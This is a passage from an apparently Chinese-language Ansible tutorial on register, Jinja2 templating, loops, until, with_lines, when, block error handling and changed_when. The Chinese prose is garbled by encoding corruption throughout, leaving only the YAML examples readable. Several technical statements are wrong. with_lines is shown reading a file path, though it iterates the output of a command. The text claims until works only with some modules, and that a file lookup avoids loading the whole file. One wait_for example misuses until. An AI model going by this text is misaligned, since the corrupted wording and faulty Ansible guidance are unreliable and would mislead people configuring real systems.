åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œregister: command_output å°†æ•è· echo å‘½ä»¤çš„è¾“å‡ºï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨ command_output å˜é‡ä¸­ã€‚æ¥ä¸‹æ¥çš„ä»»åŠ¡ä½¿ç”¨ debug æ¨¡å—æ¥æ˜¾ç¤ºè¿™ä¸ªå˜é‡çš„å€¼ã€‚\nregister å˜é‡å¯¹è±¡ä¸­åŒ…å«å¤šä¸ªå±æ€§ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦ä½¿ç”¨å®ƒä»¬ã€‚ä¸€äº›å¸¸ç”¨çš„å±æ€§åŒ…æ‹¬ï¼š\nstdoutï¼šæ•è·ä»»åŠ¡çš„æ ‡å‡†è¾“å‡ºå†…å®¹ã€‚ stderrï¼šæ•è·ä»»åŠ¡çš„æ ‡å‡†é”™è¯¯è¾“å‡ºå†…å®¹ã€‚ rcï¼šæ•è·ä»»åŠ¡çš„è¿”å›ä»£ç ï¼ˆé€€å‡ºçŠ¶æ€ç ï¼‰ã€‚ changedï¼šæŒ‡ç¤ºä»»åŠ¡æ˜¯å¦å¯¼è‡´äº†å˜åŒ–ï¼ˆTrue æˆ– Falseï¼‰ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ›´å¤æ‚çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•æ ¹æ® register å˜é‡çš„å€¼æ¥æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ï¼š\n--- - name: Check if a file exists hosts: myhosts tasks: - name: Check file existence stat: path: /path/to/file.txt register: file_status - name: Display file status debug: msg: \u0026#34;File exists: {{ file_status.stat.exists }}\u0026#34; when: file_status.stat.exists - name: Create the file if it doesn\u0026#39;t exist file: path: /path/to/file.txt state: touch when: not file_status.stat.exists åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ stat æ¨¡å—æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ file_status å˜é‡ä¸­ã€‚æ¥ä¸‹æ¥çš„ä¸¤ä¸ªä»»åŠ¡æ ¹æ® file_status çš„å€¼æ¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼šå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™æ˜¾ç¤ºä¸€æ¡æ¶ˆæ¯ï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ã€‚\næ€»ä¹‹ï¼Œregister æ˜¯ Ansible ä¸­éå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œå¯ä»¥æ•è·ä»»åŠ¡çš„è¾“å‡ºå’ŒçŠ¶æ€ï¼Œå¹¶åœ¨ playbook ä¸­è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ã€åˆ¤æ–­å’Œæ§åˆ¶æµç¨‹ã€‚\n3.8 Jinja2 æ¨¡æ¿çš„ä»‹ç»å’Œä½¿ç”¨ Jinja2 æ˜¯ä¸€ç§æ¨¡æ¿å¼•æ“ï¼Œå¹¿æ³›ç”¨äºå°†åŠ¨æ€å†…å®¹åµŒå…¥é™æ€æ–‡æœ¬ä¸­ï¼Œä¾‹å¦‚åœ¨é…ç½®æ–‡ä»¶ã€æŠ¥å‘Šç”Ÿæˆå’Œæ–‡æ¡£è‡ªåŠ¨ç”Ÿæˆç­‰é¢†åŸŸã€‚åœ¨ Ansible ä¸­ï¼ŒJinja2 ç”¨äºå¤„ç†å˜é‡ã€æ¡ä»¶è¯­å¥å’Œå¾ªç¯ï¼Œä»¥ç”ŸæˆåŠ¨æ€çš„é…ç½®æ–‡ä»¶å’Œä»»åŠ¡ã€‚\nåŸºæœ¬æ¦‚å¿µï¼š\nJinja2 æ¨¡æ¿å¼•æ“åŸºäº Pythonï¼Œå®ƒå…è®¸ä½ åœ¨æ–‡æœ¬ä¸­æ’å…¥åŠ¨æ€å€¼ã€æ‰§è¡Œæ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯æ“ä½œã€‚æ¨¡æ¿ä½¿ç”¨åŒå¤§æ‹¬å· {{ }} æ¥è¡¨ç¤ºå˜é‡ï¼Œ{% %} æ¥è¡¨ç¤ºæ§åˆ¶è¯­å¥ï¼Œå¦‚æ¡ä»¶å’Œå¾ªç¯ã€‚\nä½¿ç”¨æ–¹æ³•ï¼š\nä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ Jinja2 æ¨¡æ¿ç”¨æ³•ç¤ºä¾‹ï¼š\n1. æ’å…¥å˜é‡ï¼š\nHello, {{ name }}! è¿™å°†ä¼šå°† name å˜é‡çš„å€¼æ’å…¥åˆ°æ–‡æœ¬ä¸­ã€‚\n2. ä½¿ç”¨æ¡ä»¶è¯­å¥ï¼š\n{% if age \u0026gt; 18 %} You are an adult. {% else %} You are not yet an adult. {% endif %} æ ¹æ®æ¡ä»¶åˆ¤æ–­æ¥æ˜¾ç¤ºä¸åŒçš„æ–‡æœ¬ã€‚\n3. å¾ªç¯ï¼š\n{% for item in items %} - {{ item }} {% endfor %} åœ¨å¾ªç¯ä¸­éå†åˆ—è¡¨ items å¹¶ä¸ºæ¯ä¸ªé¡¹ç›®ç”Ÿæˆæ–‡æœ¬ã€‚\n4. è¿‡æ»¤å™¨ï¼š\n{{ text | upper }} ä½¿ç”¨è¿‡æ»¤å™¨å°†æ–‡æœ¬è½¬æ¢ä¸ºå¤§å†™ã€‚\nåœ¨ Ansible ä¸­çš„åº”ç”¨ï¼š\nåœ¨ Ansible Playbooks å’Œæ¨¡æ¿ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ Jinja2 æ¥åŠ¨æ€ç”Ÿæˆé…ç½®æ–‡ä»¶ã€ä»»åŠ¡å’Œå˜é‡ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨é…ç½®æ–‡ä»¶æ¨¡æ¿ä¸­æ’å…¥ä¸»æœºå’Œå˜é‡ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨ Ansible å°†æ¨¡æ¿æ¸²æŸ“ä¸ºå®é™…çš„é…ç½®æ–‡ä»¶ã€‚\nç¤ºä¾‹ï¼š\nå‡è®¾ä½ æœ‰ä¸€ä¸ª web_servers ä¸»æœºç»„ï¼Œå¹¶ä¸”ä½ æƒ³ä¸ºæ¯å°ä¸»æœºç”Ÿæˆä¸€ä¸ª Nginx é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸»æœºçš„ IP å’Œç«¯å£ä¿¡æ¯ã€‚\nnginx.conf.j2 æ¨¡æ¿æ–‡ä»¶ï¼š\nserver { listen {{ nginx_port }}; server_name {{ ansible_host }}; location / { proxy_pass http://{{ ansible_host }}:{{ app_port }}; } } playbook.yml æ–‡ä»¶ï¼š\n--- - name: Generate Nginx configs hosts: web_servers tasks: - name: Render Nginx config template: src: nginx.conf.j2 dest: /etc/nginx/sites-available/{{ ansible_host }} åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œnginx.conf.j2 æ˜¯ä¸€ä¸ª Jinja2 æ¨¡æ¿æ–‡ä»¶ï¼Œä½¿ç”¨äº†å˜é‡å’Œæ§åˆ¶è¯­å¥æ¥åŠ¨æ€ç”Ÿæˆ Nginx é…ç½®æ–‡ä»¶ã€‚template æ¨¡å—ä¼šå°†æ¨¡æ¿æ¸²æŸ“ä¸ºå®é™…çš„é…ç½®æ–‡ä»¶ï¼Œæ”¾ç½®åœ¨ /etc/nginx/sites-available ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸ä¸»æœºåç›¸åŒã€‚\næ€»ç»“ï¼š\nJinja2 æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ¨¡æ¿å¼•æ“ï¼Œå¯ä»¥åœ¨ Ansible ä¸­ç”¨äºç”ŸæˆåŠ¨æ€å†…å®¹ï¼Œä»è€Œæé«˜é…ç½®ç®¡ç†å’Œè‡ªåŠ¨åŒ–éƒ¨ç½²çš„çµæ´»æ€§å’Œæ•ˆç‡ã€‚é€šè¿‡ä½¿ç”¨ Jinja2ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦å°†å˜é‡ã€æ¡ä»¶å’Œå¾ªç¯åµŒå…¥åˆ°æ–‡æœ¬ä¸­ï¼Œç”Ÿæˆç¬¦åˆè¦æ±‚çš„é…ç½®å’Œä»»åŠ¡ã€‚\n3.9 å¾ªç¯å’Œè¿­ä»£ 3.7.8 loop åœ¨ Ansible ä¸­ï¼Œè¿­ä»£å’Œå¾ªç¯æ˜¯éå¸¸é‡è¦çš„æ¦‚å¿µï¼Œå®ƒä»¬å…è®¸ä½ å¯¹ä¸€ç»„ä¸»æœºæˆ–ä¸€ç»„æ•°æ®æ‰§è¡Œç›¸åŒçš„æ“ä½œã€‚Ansible æä¾›äº†å¤šç§æ–¹æ³•æ¥å®ç°è¿­ä»£å’Œå¾ªç¯ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ loop å…³é”®å­—æˆ– with_* å…³é”®å­—ç³»åˆ—ã€‚\nä»¥ä¸‹æ˜¯ Ansible ä¸­å®ç°è¿­ä»£å’Œå¾ªç¯çš„ä¸€äº›æ–¹æ³•ï¼š\nä½¿ç”¨ loop å…³é”®å­—ï¼š loop å…³é”®å­—å…è®¸ä½ åœ¨ä»»åŠ¡çº§åˆ«å¾ªç¯æ‰§è¡Œä»»åŠ¡ã€‚ä½ å¯ä»¥å°†å…¶ä¸ items å‚æ•°ç»“åˆä½¿ç”¨ï¼Œä¼ é€’ä¸€ä¸ªåˆ—è¡¨æˆ–å­—å…¸ï¼Œç„¶ååœ¨æ¯æ¬¡è¿­ä»£ä¸­è®¿é—®è¯¥åˆ—è¡¨æˆ–å­—å…¸çš„å…ƒç´ ã€‚\n- name: Loop example debug: msg: \u0026#34;Item: {{ item }}\u0026#34; loop: - item1 - item2 - item3 ä½¿ç”¨ with_itemsï¼š åœ¨æ—§ç‰ˆæœ¬çš„ Ansible ä¸­ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ° with_items å…³é”®å­—ï¼Œå®ƒåœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­å·²è¢« loop æ›¿ä»£ï¼ˆansible 2.5+ï¼‰ï¼Œä½†åœ¨ä¸€äº›æ—§ä»£ç ä¸­ä»ç„¶å¯èƒ½ä¼šä½¿ç”¨ã€‚\n- name: Loop example (with_items) debug: msg: \u0026#34;Item: {{ item }}\u0026#34; with_items: - item1 - item2 - item3 ä½¿ç”¨å…¶ä»– with_* å…³é”®å­—ï¼š Ansible æä¾›äº†å¤šä¸ª with_* å…³é”®å­—ï¼Œä¾‹å¦‚ with_dictã€with_fileglobã€with_sequence ç­‰ï¼Œç”¨äºåœ¨ä¸åŒæƒ…å†µä¸‹è¿›è¡Œå¾ªç¯æ“ä½œã€‚\n- name: Looping with a dictionary debug: msg: \u0026#34;Key: {{ item.key }}, Value: {{ item.value }}\u0026#34; with_dict: key1: value1 key2: value2 key3: value3 è¿™äº›ç¤ºä¾‹åªæ˜¯ä»‹ç»äº† Ansible ä¸­è¿­ä»£å’Œå¾ªç¯çš„åŸºæœ¬æ¦‚å¿µã€‚ä½ å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦ï¼Œç»“åˆ Ansible çš„æ¨¡å—å’ŒåŠŸèƒ½ï¼Œæ›´å¤æ‚åœ°å®ç°è¿­ä»£å’Œå¾ªç¯æ“ä½œã€‚æ— è®ºä½ æ˜¯åœ¨å¤„ç†ä¸»æœºè¿˜æ˜¯æ•°æ®é›†ï¼Œè¿­ä»£å’Œå¾ªç¯éƒ½èƒ½å¸®åŠ©ä½ æ›´é«˜æ•ˆåœ°ç®¡ç†å’Œé…ç½®ç³»ç»Ÿã€‚\n3.7.9 until åœ¨Ansibleä¸­ï¼Œ\u0026ldquo;until\u0026rdquo; æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶å¾ªç¯æ‰§è¡Œä»»åŠ¡çš„å…³é”®å­—ã€‚å®ƒé€šå¸¸ä¸ \u0026ldquo;register\u0026rdquo;ï¼ˆç”¨äºå­˜å‚¨ä»»åŠ¡æ‰§è¡Œç»“æœï¼‰å’Œä¸€äº›æ¡ä»¶ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶ä¹‹å‰é‡å¤æ‰§è¡ŒæŸä¸ªä»»åŠ¡ã€‚\u0026ldquo;until\u0026rdquo; çš„ä¸»è¦ä½œç”¨æ˜¯å…è®¸ä»»åŠ¡åœ¨è¾¾åˆ°é¢„æœŸçŠ¶æ€ä¹‹å‰é‡è¯•ï¼Œç›´åˆ°æ»¡è¶³ç‰¹å®šæ¡ä»¶ä¸ºæ­¢ã€‚\nä»¥ä¸‹æ˜¯ \u0026ldquo;until\u0026rdquo; å…³é”®å­—çš„åŸºæœ¬è¯­æ³•ï¼š\n- name: Retry a task until a condition is met some_module: # Replace with the actual module you\u0026#39;re using # module arguments... register: result # Store the task execution result in the \u0026#39;result\u0026#39; variable until: result is success # The condition to check, can be customized based on the task result retries: 10 # Number of times to retry the task delay: 10 # Time (in seconds) to wait between retries åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ\u0026ldquo;some_module\u0026rdquo; æ˜¯è¦æ‰§è¡Œçš„ä»»åŠ¡æ¨¡å—ï¼Œ\u0026ldquo;result\u0026rdquo; æ˜¯ç”¨äºå­˜å‚¨ä»»åŠ¡æ‰§è¡Œç»“æœçš„å˜é‡ã€‚é€šè¿‡ \u0026ldquo;until\u0026rdquo; å…³é”®å­—ï¼Œä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªæ¡ä»¶æ¥æ£€æŸ¥ä»»åŠ¡æ‰§è¡Œç»“æœæ˜¯å¦æ»¡è¶³é¢„æœŸã€‚å¦‚æœæ¡ä»¶ä¸æ»¡è¶³ï¼Œä»»åŠ¡å°†åœ¨ \u0026ldquo;retries\u0026rdquo; æ¬¡æ•°å†…é‡å¤æ‰§è¡Œï¼Œæ¯æ¬¡é‡è¯•ä¹‹é—´ä¼šç­‰å¾… \u0026ldquo;delay\u0026rdquo; ç§’ã€‚\nè¿™æ˜¯ä¸€ä¸ªæ›´å…·ä½“çš„ç¤ºä¾‹ï¼Œå‡è®¾ä½ è¦ç­‰å¾…æŸä¸ªæœåŠ¡å¯åŠ¨æˆåŠŸåæ‰ç»§ç»­æ‰§è¡Œåç»­ä»»åŠ¡ï¼š\n- name: Start the service systemd: name: my-service state: started register: service_result - name: Wait for the service to be up wait_for: host: localhost port: 8080 until: service_result is success retries: 10 delay: 5 åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ \u0026ldquo;systemd\u0026rdquo; æ¨¡å—å¯åŠ¨äº†ä¸€ä¸ªåä¸º \u0026ldquo;my-service\u0026rdquo; çš„æœåŠ¡ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ \u0026ldquo;service_result\u0026rdquo; å˜é‡ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ \u0026ldquo;wait_for\u0026rdquo; æ¨¡å—ç­‰å¾… localhost çš„ 8080 ç«¯å£å¼€æ”¾ï¼Œç›´åˆ° \u0026ldquo;service_result\u0026rdquo; å˜é‡çš„å€¼å˜ä¸º \u0026ldquo;success\u0026rdquo;ï¼Œæˆ–è€…è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ä¸ºæ­¢ã€‚\nè¯·æ³¨æ„ï¼Œ\u0026ldquo;until\u0026rdquo; å¹¶ä¸æ˜¯æ‰€æœ‰Ansibleæ¨¡å—éƒ½æ”¯æŒçš„å‚æ•°ï¼Œåªæœ‰éƒ¨åˆ†æ¨¡å—ï¼ˆå¦‚ \u0026ldquo;wait_for\u0026rdquo;ã€\u0026ldquo;command\u0026rdquo; ç­‰ï¼‰å…è®¸åœ¨ä»»åŠ¡çº§åˆ«ä½¿ç”¨ \u0026ldquo;until\u0026rdquo; æ¥æ‰§è¡Œæ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯æ“ä½œã€‚\n3.7.10 with_lines åœ¨ Ansible ä¸­ï¼Œwith_lines æ˜¯ä¸€ä¸ªç”¨äºåœ¨ä»»åŠ¡ä¸­éå†æ–‡æœ¬è¡Œçš„å¾ªç¯æ„é€ ã€‚å®ƒå…è®¸ä½ å°†æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªè¿­ä»£é¡¹ï¼Œä»¥ä¾¿åœ¨æ¯æ¬¡è¿­ä»£ä¸­æ‰§è¡Œä»»åŠ¡ã€‚\nä»¥ä¸‹æ˜¯ with_lines çš„åŸºæœ¬è¯­æ³•ï¼š\n- name: Perform tasks with each line of a file some_module: # Replace with the actual module you\u0026#39;re using # module arguments... with_lines: - /path/to/file.txt # Path to the file containing lines to iterate over åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œsome_module æ˜¯è¦æ‰§è¡Œçš„ä»»åŠ¡æ¨¡å—ï¼Œ/path/to/file.txt æ˜¯åŒ…å«è¦è¿­ä»£çš„æ–‡æœ¬è¡Œçš„æ–‡ä»¶çš„è·¯å¾„ã€‚\nè¿™æ˜¯ä¸€ä¸ªæ›´å…·ä½“çš„ç¤ºä¾‹ï¼Œå‡è®¾ä½ æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›IPåœ°å€ï¼Œä½ æƒ³ä½¿ç”¨ ping å‘½ä»¤å¯¹æ¯ä¸ªIPåœ°å€æ‰§è¡Œç½‘ç»œè¿æ¥æµ‹è¯•ï¼š\n- name: Ping each IP address from a file ping: with_lines: - /path/to/ip_addresses.txt åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œping æ¨¡å—å°†ä¼šå¯¹æ–‡ä»¶ /path/to/ip_addresses.txt ä¸­çš„æ¯ä¸ªIPåœ°å€æ‰§è¡Œç½‘ç»œè¿æ¥æµ‹è¯•ã€‚Ansibleä¼šå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªè¿­ä»£é¡¹ä¼ é€’ç»™ ping æ¨¡å—ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œwith_lines åœ¨å¤„ç†å¤§å‹æ–‡ä»¶æ—¶å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ï¼Œå› ä¸ºå®ƒéœ€è¦ä¸€æ¬¡æ€§è¯»å–æ•´ä¸ªæ–‡ä»¶å¹¶å°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å¦‚æœæ–‡ä»¶è¾ƒå¤§ï¼Œä½ å¯èƒ½éœ€è¦è€ƒè™‘ä½¿ç”¨æ›´é€‚åˆçš„æ–¹æ³•ï¼Œä¾‹å¦‚å°†æ–‡ä»¶å†…å®¹å­˜å‚¨åœ¨å˜é‡ä¸­ï¼Œç„¶åä½¿ç”¨å¾ªç¯ç»“æ„éå†å˜é‡ã€‚\nå¦å¤–ï¼Œä» Ansible 2.5 ç‰ˆæœ¬å¼€å§‹ï¼Œwith_lines å·²è¢«å¼ƒç”¨ï¼Œå»ºè®®ä½¿ç”¨ loop æ„é€ ä»£æ›¿ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨ loop æ¥å®Œæˆä¸Šè¿°ç¤ºä¾‹ï¼š\n- name: Ping each IP address from a file ping: loop: \u0026#34;{{ lookup(\u0026#39;file\u0026#39;, \u0026#39;/path/to/ip_addresses.txt\u0026#39;).splitlines() }}\u0026#34; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œlookup('file', '/path/to/ip_addresses.txt').splitlines() å°†ä¼šè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨æ¢è¡Œç¬¦å°†å…¶æ‹†åˆ†ä¸ºè¡Œçš„åˆ—è¡¨ï¼Œç„¶åä½¿ç”¨ loop å¯¹æ¯ä¸ªIPåœ°å€æ‰§è¡Œ ping æ¨¡å—ã€‚è¿™ç§æ–¹æ³•æ›´ä¸ºçµæ´»ä¸”ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ•´ä¸ªæ–‡ä»¶ã€‚\n3.10 æ¡ä»¶åˆ¤æ–­ when åœ¨ Ansible ä¸­ï¼Œwhen æ˜¯ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œå®ƒå…è®¸ä½ åœ¨ä»»åŠ¡æ‰§è¡Œä¹‹å‰æŒ‡å®šä¸€ä¸ªæ¡ä»¶ï¼Œåªæœ‰å½“æ¡ä»¶æ»¡è¶³æ—¶ï¼Œä»»åŠ¡æ‰ä¼šè¢«æ‰§è¡Œã€‚è¿™å¯ä»¥ç”¨äºæ ¹æ®ä¸åŒçš„æƒ…å†µæ¥å†³å®šæ˜¯å¦è·³è¿‡æˆ–æ‰§è¡ŒæŸä¸ªä»»åŠ¡ã€‚\nä»¥ä¸‹æ˜¯ when çš„åŸºæœ¬è¯­æ³•ï¼š\n- name: Perform a task conditionally some_module: # Replace with the actual module you\u0026#39;re using # module arguments... when: condition # The condition to check before executing the task åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œsome_module æ˜¯è¦æ‰§è¡Œçš„ä»»åŠ¡æ¨¡å—ï¼Œcondition æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œåªæœ‰åœ¨è¡¨è¾¾å¼è¯„ä¼°ä¸º true æ—¶ï¼Œä»»åŠ¡æ‰ä¼šè¢«æ‰§è¡Œã€‚\nè¿™æ˜¯ä¸€ä¸ªæ›´å…·ä½“çš„ç¤ºä¾‹ï¼Œå‡è®¾ä½ åªæƒ³åœ¨æ“ä½œç³»ç»Ÿæ˜¯ Ubuntu æ—¶æ‰æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼š\n- name: Install a package only on Ubuntu apt: name: some-package state: present when: ansible_distribution == \u0026#39;Ubuntu\u0026#39; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œapt æ¨¡å—ç”¨äºå®‰è£…è½¯ä»¶åŒ…ï¼Œä½†æ˜¯åªæœ‰å½“ Ansible å˜é‡ ansible_distribution çš„å€¼ä¸º \u0026lsquo;Ubuntu\u0026rsquo; æ—¶ï¼Œä»»åŠ¡æ‰ä¼šè¢«æ‰§è¡Œã€‚\nwhen è¡¨è¾¾å¼å¯ä»¥æ˜¯ Ansible å˜é‡ã€äº‹å®ï¼ˆfactsï¼‰ã€æ¯”è¾ƒæ“ä½œã€é€»è¾‘è¿ç®—ç­‰ã€‚ä½ å¯ä»¥æ ¹æ®éœ€è¦æ¥åˆ›å»ºå¤æ‚çš„æ¡ä»¶æ¥å†³å®šä»»åŠ¡æ˜¯å¦åº”è¯¥è¢«æ‰§è¡Œã€‚ä¾‹å¦‚ï¼š\n- name: Perform a task only if a certain variable is true some_module: # module arguments... when: my_variable == true - name: Perform a task only if a file exists some_module: # module arguments... when: ansible_facts[\u0026#39;file_exists\u0026#39;] == true - name: Perform a task only if multiple conditions are true some_module: # module arguments... when: ansible_os_family == \u0026#39;Debian\u0026#39; and ansible_distribution_version | version_compare(\u0026#39;9\u0026#39;, \u0026#39;\u0026gt;=\u0026#39;) è¯·æ³¨æ„ï¼Œwhen æ˜¯ä¸€ä¸ªåœ¨ä»»åŠ¡çº§åˆ«ä½¿ç”¨çš„å‚æ•°ï¼Œå®ƒé€‚ç”¨äºå•ä¸ªä»»åŠ¡ã€‚å¦‚æœä½ å¸Œæœ›åœ¨å‰§æœ¬ï¼ˆplaybookï¼‰çº§åˆ«ä¸Šè®¾ç½®æ¡ä»¶ï¼Œå¯ä»¥åœ¨æ¯ä¸ªä»»åŠ¡ä¸­ä½¿ç”¨ block ç»“æ„ï¼Œç„¶ååœ¨ block ç»“æ„ä¸Šä½¿ç”¨ when æ¡ä»¶ã€‚\n3.11 åˆ†ç»„ block åœ¨ Ansible ä¸­ï¼Œblock æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºä»»åŠ¡å—çš„ç»“æ„ã€‚å®ƒå…è®¸ä½ å°†å¤šä¸ªç›¸å…³çš„ä»»åŠ¡ç»„ç»‡åœ¨ä¸€èµ·ï¼Œä»¥ä¾¿åœ¨å…¶ä¸­åº”ç”¨å…±åŒçš„æ¡ä»¶ã€å¤„ç†é”™è¯¯ä»¥åŠè®¾ç½®é€šç”¨çš„å‚æ•°ã€‚block å¯ä»¥ä¸ rescue å’Œ always é…åˆä½¿ç”¨ï¼Œä»¥æä¾›æ›´ä¸°å¯Œçš„ä»»åŠ¡æ§åˆ¶å’Œé”™è¯¯å¤„ç†èƒ½åŠ›ã€‚\nä»¥ä¸‹æ˜¯ block ç»“æ„çš„åŸºæœ¬è¯­æ³•ï¼š\n- name: A playbook with a block hosts: target_hosts tasks: - block: # Start of the block - name: Task 1 some_module: # module arguments... - name: Task 2 some_module: # module arguments... rescue: # Optional, tasks to run if an error occurs within the block - name: Rescue task some_module: # module arguments... always: # Optional, tasks to run regardless of success or failure - name: Always task some_module: # module arguments... åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œblock ç»“æ„å†…åŒ…å«ä¸¤ä¸ªä»»åŠ¡ï¼ˆTask 1 å’Œ Task 2ï¼‰ã€‚å¦‚æœ block ç»“æ„å†…çš„ä»»åŠ¡ä¸­çš„ä»»ä½•ä¸€ä¸ªå¤±è´¥ï¼Œé‚£ä¹ˆ rescue éƒ¨åˆ†çš„ä»»åŠ¡å°†ä¼šè¢«æ‰§è¡Œã€‚æ— è®º block ç»“æ„å†…çš„ä»»åŠ¡æˆåŠŸä¸å¦ï¼Œalways éƒ¨åˆ†çš„ä»»åŠ¡éƒ½ä¼šè¢«æ‰§è¡Œã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªæ›´å…·ä½“çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº† block ç»“æ„å¦‚ä½•ä¸é”™è¯¯å¤„ç†å’Œæ¡ä»¶ä¸€èµ·ä½¿ç”¨ï¼š\n- name: Install a package with error handling hosts: target_hosts tasks: - block: - name: Install the package apt: name: some-package state: present rescue: - name: Handle error debug: msg: \u0026#34;An error occurred while installing the package.\u0026#34; always: - name: Clean up apt: name: some-package state: absent åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œblock ç»“æ„å†…çš„ä»»åŠ¡å°è¯•å®‰è£…ä¸€ä¸ªè½¯ä»¶åŒ…ã€‚å¦‚æœå®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œrescue éƒ¨åˆ†çš„ä»»åŠ¡ä¼šè¢«æ‰§è¡Œï¼Œæ˜¾ç¤ºä¸€æ¡é”™è¯¯æ¶ˆæ¯ã€‚æ— è®ºæ˜¯å¦å‡ºç°é”™è¯¯ï¼Œalways éƒ¨åˆ†çš„ä»»åŠ¡éƒ½ä¼šè¢«æ‰§è¡Œï¼Œç¡®ä¿æœ€ç»ˆå°†è½¯ä»¶åŒ…ä»ç³»ç»Ÿä¸­ç§»é™¤ã€‚\nä½¿ç”¨ block ç»“æ„å¯ä»¥ä½¿å‰§æœ¬æ›´å…·å¯è¯»æ€§ï¼Œå‡å°‘å†—ä½™ä»£ç ï¼Œå¹¶æä¾›æ›´å¥½çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå› ä¸ºä½ å¯ä»¥é›†ä¸­ç®¡ç†é”™è¯¯çš„å¤„ç†æ–¹å¼ã€‚\n3.12 changed_when å½“ç¡®å®šæŸä¸ª task ä¸ä¼šå¯¹è¢«æ§åˆ¶ç«¯åšä¿®æ”¹æ—¶ä½†æ‰§è¡Œç»“æœå´æ˜¾ç¤ºæ˜¯é»„è‰²çš„ changed çŠ¶æ€, å¯ä»¥é€šè¿‡changed_when: false å…³é—­ changed çŠ¶æ€\nåœ¨ Ansible ä¸­ï¼Œchanged_when æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶ä»»åŠ¡æ˜¯å¦è¢«æ ‡è®°ä¸ºå·²æ›´æ”¹ï¼ˆchangedï¼‰çš„é€‰é¡¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä»»åŠ¡æ‰§è¡Œå¯¼è‡´äº†ä»»ä½•çŠ¶æ€æ›´æ”¹ï¼Œè¯¥ä»»åŠ¡å°†è¢«æ ‡è®°ä¸ºå·²æ›´æ”¹ã€‚ç„¶è€Œï¼Œé€šè¿‡ä½¿ç”¨ changed_whenï¼Œä½ å¯ä»¥è‡ªå®šä¹‰æ ‡è®°ä»»åŠ¡æ˜¯å¦å·²æ›´æ”¹çš„æ¡ä»¶ï¼Œè€Œä¸ä»…ä»…ä¾èµ–äºé»˜è®¤çš„çŠ¶æ€å˜åŒ–æ£€æµ‹ã€‚\nchanged_when å…è®¸ä½ åœ¨ä»»åŠ¡çº§åˆ«è®¾ç½®ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ã€‚å¦‚æœè¯¥è¡¨è¾¾å¼è¯„ä¼°ä¸º trueï¼Œé‚£ä¹ˆä»»åŠ¡å°†è¢«æ ‡è®°ä¸ºå·²æ›´æ”¹ã€‚å¦‚æœè¯¥è¡¨è¾¾å¼è¯„ä¼°ä¸º falseï¼Œé‚£ä¹ˆä»»åŠ¡å°†è¢«æ 